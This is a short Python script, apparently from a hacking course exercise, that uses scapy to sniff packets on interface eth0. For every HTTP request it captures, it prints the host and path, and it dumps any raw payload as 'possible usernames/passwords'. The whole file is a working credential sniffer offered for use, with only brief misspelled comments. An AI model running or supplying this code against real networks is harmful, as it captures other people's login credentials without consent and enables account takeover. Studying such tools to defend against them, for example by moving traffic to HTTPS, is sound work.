#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


# iface defines the interface to capture packets/ stors say cpmputer not to store packets/calls the function ecahtime when ever packet is captured
# filter is used to filter the packets /here we we specifiy arp se that we get arpn packets data/for eg:we can give udp and tcp also
# filter doesnot allow us to filter packets over http so we need intsall a module(pip3 install scapy-http)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# check packet layers by packet.show and set required fields
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        return packet[scapy.Raw].load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTP Request >>" + url)

        login_info=get_login_info(packet)
        if login_info:
            print("\n\n[+] possible usernames/passwords>>>" + packet[scapy.Raw].load + "\n\n")


sniff("eth0")
